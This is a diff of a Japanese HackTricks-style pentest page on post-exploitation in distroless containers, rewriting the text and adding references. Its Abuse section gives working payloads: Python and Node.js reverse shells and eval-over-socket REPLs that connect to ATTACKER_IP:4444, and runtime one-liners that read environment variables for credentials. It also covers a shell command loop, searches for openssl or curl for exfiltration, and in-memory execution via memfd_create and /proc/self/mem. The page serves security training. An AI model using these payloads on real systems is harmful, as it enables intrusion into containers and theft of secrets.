@@ -2,70 +2,71 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Overview
+## 概要
 
-**distroless** container image は、**特定の1つの application を実行するために必要な最小限の runtime component**だけを含み、package manager、shell、大規模な汎用 userland utility など、通常の distribution tooling を意図的に削除した image です。実際には、distroless image には application binary または runtime、shared library、certificate bundle、そして非常に小さな filesystem layout だけが含まれていることがよくあります。
+**distroless** container image は、特定のアプリケーションを実行するために必要な**最小限の runtime コンポーネント**を含み、通常のディストリビューションにある package manager、shell、大量の汎用 userland utility などを意図的に取り除いています。実際の distroless image に含まれるのは、多くの場合、アプリケーションの binary または runtime、shared library、certificate bundle、およびごく小さな filesystem 構成だけです。 <sup>[[1]](#references)</sup>
 
-重要なのは、distroless が新しい kernel isolation primitive だということではありません。Distroless は**image design strategy**です。container filesystem の**内部で**利用できるものを変えるのであって、kernel が container をどのように isolate するかを変えるものではありません。この違いは重要です。distroless は、主に code execution を得た後に attacker が利用できるものを減らすことで environment を harden します。namespaces、seccomp、capabilities、AppArmor、SELinux、その他の runtime isolation mechanism の代替にはなりません。
+distroless は、新しい kernel isolation primitive というわけではありません。distroless は**image の設計戦略**です。container filesystem の**内部**で利用できるものを変えるのであり、kernel が container を隔離する方法を変えるものではありません。この違いは重要です。distroless は、攻撃者が code execution を得た後に利用できるものを減らすことで、主に環境を harden します。namespace、seccomp、capability、AppArmor、SELinux、その他の runtime isolation mechanism に取って代わるものではありません。
 
-## Why Distroless Exists
+## Distroless が使われる理由
 
-Distroless image は主に、以下を削減するために使用されます。
+distroless image は主に、次のものを減らすために使われます。
 
-- image size
-- image の operational complexity
-- vulnerability を含む可能性のある package と binary の数
-- attacker が default で利用できる post-exploitation tool の数
+- image のサイズ
+- image の運用上の複雑さ
+- vulnerability を含む可能性のある package や binary の数
+- compromise 後に攻撃者がデフォルトで利用できる post-exploitation tool の数
 
-そのため、distroless image は production application deployment で人気があります。shell、package manager、そしてほとんど汎用 tooling を含まない container は、通常、運用上の判断が容易で、compromise 後に interactive に悪用することも困難です。
+そのため、distroless image は本番環境のアプリケーション deployment で広く使われています。shell、package manager、汎用 tool がほとんど含まれない container は、通常、運用上の把握が容易であり、侵害後に対話的に悪用されにくくなります。
 
-よく知られている distroless-style image family の例は以下のとおりです。
+よく知られた distroless 形式の image family の例は次のとおりです。
 
-- Google's distroless image
-- Chainguard hardened/minimal image
+- Google の distroless image <sup>[[1]](#references)</sup>
+- Chainguard の hardened/minimal image <sup>[[2]](#references)</sup>
 
-## What Distroless Does Not Mean
+## Distroless が意味しないこと
 
-distroless container は以下を意味するものでは**ありません**。
+distroless container は、次のようなものでは**ありません**。
 
 - 自動的に rootless になる
 - 自動的に non-privileged になる
 - 自動的に read-only になる
-- 自動的に seccomp、AppArmor、SELinux によって保護される
-- 自動的に container escape から安全になる
+- seccomp、AppArmor、SELinux によって自動的に保護される
+- container escape から自動的に保護される
 
-distroless image を `--privileged`、host namespace sharing、危険な bind mount、または mount された runtime socket とともに実行することは依然として可能です。その状況では、image が minimal であっても、container は依然として壊滅的に insecure になり得ます。Distroless が変えるのは**userland attack surface**であり、**kernel trust boundary**ではありません。
+distroless image を `--privileged`、host namespace の共有、危険な bind mount、または runtime socket の mount と組み合わせて実行することは可能です。そのような場合、image が最小限であっても、container は依然として極めて危険な状態になり得ます。distroless が変えるのは**userland の attack surface**であり、**kernel の trust boundary**ではありません。
 
-## Typical Operational Characteristics
+## 一般的な運用上の特徴
 
-distroless container を compromise した場合、最初に気付くのは、一般的な前提が通用しなくなっていることです。`sh`、`bash`、`ls`、`id`、`cat` が存在しない場合があり、通常の tradecraft が想定するような libc-based environment さえ存在しないことがあります。これは offense と defense の両方に影響します。tooling がないことで、debugging、incident response、post-exploitation の方法が変わるためです。
+distroless container を compromise すると、まずよくある前提が通用しなくなっていることに気づきます。`sh`、`bash`、`ls`、`id`、`cat` がない場合があり、場合によっては、普段の tradecraft が想定するような動作をする libc ベースの環境さえありません。tool がないことは、debugging、incident response、post-exploitation のやり方を変えるため、offense と defense の両方に影響します。
 
-最も一般的な pattern は以下のとおりです。
+よく見られるパターンは次のとおりです。
 
-- application runtime は存在するが、それ以外はほとんど存在しない
-- shell が存在しないため、shell-based payload は失敗する
-- helper binary が存在しないため、一般的な enumeration one-liner は失敗する
-- read-only rootfs や、writable tmpfs location 上の `noexec` など、filesystem protection も併用されていることが多い
+- アプリケーションの runtime はあるが、それ以外はほとんどない
+- shell がないため、shell ベースの payload は失敗する
+- helper binary がないため、一般的な enumeration のワンライナーは失敗する
+- read-only rootfs や、書き込み可能な tmpfs の場所に設定された `noexec` など、filesystem の保護もよく使われている
 
-この組み合わせが、通常「weaponizing distroless」について語られる理由です。
+こうした要素が重なることで、一般に「distroless の weaponize」と呼ばれる状況につながります。
 
-## Distroless And Post-Exploitation
+## Distroless と Post-Exploitation
 
-distroless environment における主な offensive challenge は、必ずしも最初の RCE ではありません。多くの場合、その後に何をするかが challenge になります。exploit した workload が Python、Node.js、Java、Go などの language runtime で code execution を提供する場合、arbitrary logic を実行できる可能性はあります。しかし、他の Linux target で一般的な、通常の shell-centric workflow を利用できるとは限りません。
+distroless 環境での主な攻撃上の課題は、必ずしも最初の RCE とは限りません。その後の対応であることがよくあります。Python、Node.js、Java、Go などの言語 runtime で code execution が可能になった場合、任意の処理を実行できるかもしれません。しかし、他の Linux target で一般的な、shell 中心の通常の手法は使えません。
 
-そのため、post-exploitation は多くの場合、以下の3方向のいずれかに移行します。
+そのため、post-exploitation は次の3つの方向のいずれかに移ることがよくあります。
 
-1. **既存の language runtime を直接使用して** environment の enumerate、socket の open、file の read、追加 payload の stage を行う。
-2. filesystem が read-only である場合や、writable location が `noexec` として mount されている場合に、**独自の tooling を memory に持ち込む**。
-3. application またはその dependency に、予想外に有用なものが含まれている場合、**image 内にすでに存在する binary を悪用する**。
+1. **既存の言語 runtime を直接使う**ことで、環境を enumeration し、socket を開き、file を読み、追加の payload を stage する。
+2. filesystem が read-only、または書き込み可能な場所が `noexec` で mount されている場合は、**tool をメモリ上に持ち込む**。
+3. アプリケーションやその dependency に予想外に有用なものが含まれている場合は、**image にすでに存在する binary を悪用する**。
 
 ## Abuse
 
-### Enumerate The Runtime You Already Have
+### すでに利用できる Runtime を Enumeration する
 
-多くの distroless container には shell がありませんが、application runtime は存在します。target が Python service なら Python が存在し、Node.js が target なら Node が存在します。これにより、`/bin/sh` を一度も invoke せずに、file の enumerate、environment variable の read、reverse shell の open、in-memory execution の stage まで行えるだけの機能を得られることがよくあります。
+多くの distroless container には shell がありませんが、アプリケーションの runtime は残っています。target が Python service なら Python があり、Node.js なら Node.js があります。これだけで、`/bin/sh` を一度も呼び出さずに file の enumeration、環境変数の読み取り、reverse shell の起動、メモリ上での実行の準備を行えることがよくあります。
 
-Python を使用した簡単な例:
+Python を使った簡単な例:
+
 ```bash
 python3 - <<'PY'
 import os, socket, subprocess
@@ -75,65 +76,105 @@ print("env keys", list(os.environ)[:20])
 print("root files", os.listdir("/")[:30])
 PY
 ```
-Node.jsによる簡単な例：
+
+Node.jsを使った簡単な例:
+
 ```bash
 node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
 ```
-Impact:
 
-- 環境変数の取得（認証情報や service endpoint が含まれていることが多い）
-- `/bin/ls` なしでの filesystem enumeration
-- 書き込み可能なパスと mount 済み secrets の特定
+影響:
 
-### `/bin/sh` なしの Reverse Shell
+- 環境変数の取得。多くの場合、認証情報やサービスエンドポイントが含まれる
+- `/bin/ls` を使わないファイルシステムの列挙
+- 書き込み可能なパスやマウントされた secrets の特定
 
-image に `sh` や `bash` が含まれていない場合、classic な shell-based reverse shell は直ちに失敗する可能性があります。その場合は、インストール済みの language runtime を使用します。
+### `/bin/sh` のない対話型ランタイム
 
-Python reverse shell：
+イメージに `sh` や `bash` が含まれていない場合、従来のシェルベースの reverse shell は失敗します。その場合は、存在しないシェルを起動する代わりに、インストール済みの言語ランタイムで対話型セッションを公開します。
+
+たとえば、次の Python payload は、対話型の Python コンソールをソケット経由でリダイレクトします。
+
 ```bash
 python3 - <<'PY'
-import os,pty,socket
-s=socket.socket()
-s.connect(("ATTACKER_IP",4444))
-for fd in (0,1,2):
-os.dup2(s.fileno(),fd)
+import code, socket, sys
+s = socket.create_connection(("ATTACKER_IP", 4444))
+stream = s.makefile("rw", buffering=1)
+sys.stdin = sys.stdout = sys.stderr = stream
+code.interact(local=globals())
+PY
+```
+
+同等のNode.jsアプローチでは、ソケット経由で受信したJavaScriptを評価できます。これはJavaScript REPLであり、オペレーティングシステムのシェルではありません。ファイルシステム、プロセス、ネットワークの操作は、NodeのAPIを通じて実行する必要があります。
+
+```bash
+node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
+```
+
+どちらの例も外部への接続性と利用可能なインタープリターを必要とし、インタープリターが提供する機能のみを利用できます。
+
+イメージに予期せず `/bin/sh` が含まれている場合は、従来のインタープリターを介した shell payload も引き続き有用です。これらは真に shell を使わないものではないため、別に示します。
+
+```bash
+# Python plus an existing /bin/sh
+python3 - <<'PY'
+import os, pty, socket
+s = socket.create_connection(("ATTACKER_IP", 4444))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
 pty.spawn("/bin/sh")
 PY
-```
-`/bin/sh` が存在しない場合は、最後の行を Python による直接的なコマンド実行、または Python REPL ループに置き換えます。
 
-Node reverse shell:
+# Node.js plus an existing /bin/sh
+node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+```
+
+古い Python の command-loop パターンは、`/bin/sh` は存在するものの、対話型 PTY の利用が不便な場合にも有用です。ここでは、実際の依存関係を明示して残しています。`subprocess.run(..., shell=True)` はシステムシェルを呼び出すため、**no-shell 技法ではありません**。
+
 ```bash
-node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+python3 -c '
+import subprocess
+while True:
+    cmd = input("sh> ")
+    if cmd.strip() in ("exit", "quit"):
+        break
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout, end="")
+    print(result.stderr, end="")
+'
 ```
-繰り返しになりますが、`/bin/sh` が存在しない場合は、shell を spawn する代わりに Node の filesystem、process、networking API を直接使用してください。
 
-### Full Example: No-Shell Python Command Loop
+### 完全な例: ShellなしのPythonコマンドループ
 
-イメージに Python はあっても shell がまったくない場合、シンプルな対話型ループだけで、完全な post-exploitation capability を維持できることがよくあります。
+イメージにPythonはあるもののShellがまったくない場合でも、ローカルのPython REPLを使ってファイルシステム、環境、ネットワークを調査できます。
+
 ```bash
 python3 - <<'PY'
-import os,subprocess
+namespace = {}
 while True:
-cmd=input("py> ")
-if cmd.strip() in ("exit","quit"):
-break
-p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
-print(p.stdout, end="")
-print(p.stderr, end="")
+    source = input("py> ")
+    if source.strip() in ("exit", "quit"):
+        break
+    try:
+        result = eval(source, namespace)
+        if result is not None:
+            print(repr(result))
+    except SyntaxError:
+        exec(source, namespace)
 PY
 ```
-これはインタラクティブな shell binary を必要としません。攻撃者の観点では、その影響は基本的な shell と実質的に同じです。つまり、既存の runtime を介した command execution、enumeration、追加 payload の staging が可能です。
 
-### メモリ上での Tool Execution
+このループは`/bin/sh`を起動しません。Pythonの式や文を直接評価するため、操作にはshellコマンドではなくPython APIを使う必要があります。この制約はありますが、基本的なshellがもたらす効果の多くを実現できます。たとえば、ファイルシステムや環境変数の列挙、データへのアクセス、ネットワーク通信、インストール済みランタイムを使った追加payloadの配置などが可能です。
 
-Distroless images は、次の設定と組み合わせて使用されることがよくあります。
+### インメモリでのツール実行
+
+Distrolessイメージは、次の設定と組み合わせられることがよくあります。
 
 - `readOnlyRootFilesystem: true`
-- `/dev/shm` などの writable だが `noexec` な tmpfs
-- package management tools の不足
+- 書き込み可能だが`noexec`のtmpfs（`/dev/shm`など）
+- パッケージ管理ツールがない
 
-この組み合わせにより、「binary を disk に download して実行する」という従来の workflow は信頼性が低くなります。そのような場合、memory execution techniques が主な選択肢になります。
+この組み合わせでは、「バイナリをディスクにダウンロードして実行する」という従来の手法は確実に機能しません。こうした場合、メモリ上で実行する手法が主な解決策になります。
 
 専用ページはこちらです。
 
@@ -141,64 +182,70 @@ Distroless images は、次の設定と組み合わせて使用されること�
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-そこで特に関連性の高い techniques は次のとおりです。
+特に関連性の高い手法は次のとおりです。
 
-- scripting runtimes 経由の `memfd_create` + `execve`
+- スクリプトランタイム経由の`memfd_create` + `execve` <sup>[[4]](#references)</sup>
 - DDexec / EverythingExec
 - memexec
 - memdlopen
 
-### Image 内にすでに存在する Binaries
+Python、Node.js、PHPのサービスでは、テンプレートインジェクション、プロトタイプ汚染、安全でない評価など、アプリケーションの脆弱性が侵入の起点になる可能性があります。それによってプロセス内でコード実行が可能になれば、`/proc/self/mem`を使う手法で、shellやディスク上の実行可能ファイルを介さずにloaderを実行できる場合があります。実行権限は引き続きコンテナプロセスのidentityのものです。コンテナからの脱出には、別途ランタイムまたはホスト境界の脆弱性が必要です。前提条件については、[read-only/noexec/distrolessの手法](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md)を参照してください。
 
-一部の Distroless images には、運用上必要な binaries が含まれており、compromise 後に有用になる場合があります。繰り返し確認されている例として `openssl` があります。applications が crypto や TLS 関連の tasks で必要とすることがあるためです。
+### イメージ内にすでにあるバイナリ
 
-簡単な検索 pattern は次のとおりです。
+一部のDistrolessイメージには、運用上必要なバイナリが含まれており、侵害後に役立つことがあります。よく確認される例は`openssl`です。アプリケーションが暗号化やTLS関連の処理に必要とすることがあるためです。
+
+簡単な検索パターンは次のとおりです。
+
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
-`openssl` が存在する場合、以下に利用できる可能性があります。
 
-- outbound TLS connections
-- 許可された egress channel 経由での data exfiltration
-- encoded/encrypted blobs を介した payload data の staging
+`openssl` が存在する場合、次の用途に使える可能性があります。
 
-正確な abuse の内容は実際に何がインストールされているかによって異なりますが、一般的な考え方として、distroless は「ツールがまったくない」という意味ではなく、「通常の distribution image よりもはるかに少ないツールしかない」という意味です。
+- outbound TLS 接続
+- 許可された egress channel を介したデータの exfiltration
+- encoded/encrypted blob を介した payload data の staging
 
-## Checks
+具体的な悪用方法は実際にインストールされているものによって異なりますが、基本的な考え方は、distroless は「ツールがまったくない」という意味ではなく、「通常の distribution image よりもツールがはるかに少ない」ということです。
 
-これらの checks の目的は、実際にその image が distroless なのか、また post-exploitation に利用できる runtime や helper binaries が残っているかを確認することです。
+## 確認項目
+
+これらの確認項目の目的は、実際にその image が distroless であるか、また post-exploitation に利用できる runtime や helper binary が残っているかを判断することです。
+
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
-ここで注目すべき点:
 
-- shell が存在しなくても、Python や Node などの runtime が存在する場合、post-exploitation は runtime ベースの execution に pivot すべきです。
-- root filesystem が read-only で、`/dev/shm` は writable だが `noexec` の場合、memory execution techniques の重要性がさらに高まります。
-- `openssl`、`busybox`、`java` などの補助 binary が存在する場合、それらはさらなる access を bootstrap するのに十分な機能を提供する可能性があります。
+ここで興味深い点:
 
-## Runtime のデフォルト
+- shell が存在しなくても、Python や Node などのランタイムがあれば、post-exploitation ではランタイムを利用した実行に切り替えるべきです。
+- root ファイルシステムが読み取り専用で、`/dev/shm` は書き込み可能だが `noexec` の場合、メモリ実行テクニックがより重要になります。
+- `openssl`、`busybox`、`java` などのヘルパーバイナリがあれば、さらなるアクセスを開始するのに十分な機能を提供する可能性があります。
 
-| Image / platform の種類 | デフォルト状態 | 典型的な挙動 | よくある手動での弱体化 |
+## ランタイムのデフォルト
+
+| イメージ / プラットフォームの形式 | デフォルト状態 | 典型的な動作 | よくある手動での弱体化 |
 | --- | --- | --- | --- |
-| Google distroless style images | 設計上 userland は最小限 | shell も package manager もなく、application/runtime の dependencies のみ | debugging layers、sidecar shells、busybox や tooling のコピーを追加 |
-| Chainguard minimal images | 設計上 userland は最小限 | package surface を削減し、多くの場合は1つの runtime または service に集中 | `:latest-dev` や debug variants の使用、build 中に tools をコピー |
-| distroless images を使用する Kubernetes workloads | Pod config に依存 | Distroless が影響するのは userland のみ。Pod の security posture は Pod spec と runtime のデフォルトにも依存 | ephemeral debug containers、host mounts、privileged Pod settings の追加 |
-| distroless images を実行する Docker / Podman | run flags に依存 | filesystem は最小限だが、runtime security は flags と daemon configuration にも依存 | `--privileged`、host namespace sharing、runtime socket mounts、writable host binds |
+| Google distroless 形式のイメージ | 設計上、最小限のユーザーランド | shell なし、パッケージマネージャーなし、アプリケーション / ランタイムの依存関係のみ | デバッグレイヤーやサイドカーの shell を追加する、busybox やツールをコピーする |
+| Chainguard minimal イメージ | 設計上、最小限のユーザーランド | パッケージの種類を削減し、多くの場合、単一のランタイムまたはサービスに特化 | `:latest-dev` や debug バリアントを使う、ビルド時にツールをコピーする |
+| distroless イメージを使う Kubernetes ワークロード | Pod の設定による | distroless が影響するのはユーザーランドのみ。Pod のセキュリティ態勢は、引き続き Pod spec とランタイムのデフォルトに依存する | 一時的なデバッグコンテナを追加する、ホストマウントを使う、Pod を privileged に設定する |
+| distroless イメージを実行する Docker / Podman | 実行フラグによる | ファイルシステムは最小限だが、ランタイムのセキュリティは引き続きフラグとデーモンの設定に依存する | `--privileged`、ホスト名前空間の共有、ランタイムソケットのマウント、ホストの書き込み可能な bind mount |
 
-重要な点は、distroless は **image の property** であり、runtime の protection ではないということです。その価値は、compromise 後に filesystem 内で利用できるものを削減することにあります。
+重要なのは、distroless は**イメージの特性**であり、ランタイムによる保護ではないという点です。その価値は、侵害後にファイルシステム内で利用できるものを減らすことにあります。ビルドツールを最終イメージに含めないために、マルチステージビルドがよく使われます。 <sup>[[3]](#references)</sup>
 
 ## 関連ページ
 
-distroless environments で一般的に必要となる filesystem および memory-execution bypasses について:
+distroless 環境でよく必要となる、ファイルシステムとメモリ実行のバイパスについて:
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-distroless workloads にも適用される container runtime、socket、mount の abuse について:
+distroless ワークロードにも当てはまる、コンテナランタイム、ソケット、マウントの悪用について:
 
 {{#ref}}
 runtime-api-and-daemon-exposure.md
@@ -208,4 +255,10 @@ runtime-api-and-daemon-exposure.md
 sensitive-host-mounts.md
 {{#endref}}
 
+## References
+
+- [1] [GoogleContainerTools - Distrolessコンテナイメージ](https://github.com/GoogleContainerTools/distroless)
+- [2] [Chainguard Images ドキュメント](https://edu.chainguard.dev/chainguard/chainguard-images/)
+- [3] [Docker Docs - マルチステージビルド](https://docs.docker.com/build/building/multi-stage/)
+- [4] [`memfd_create(2)` - Linuxマニュアルページ](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
 {{#include ../../../banners/hacktricks-training.md}}
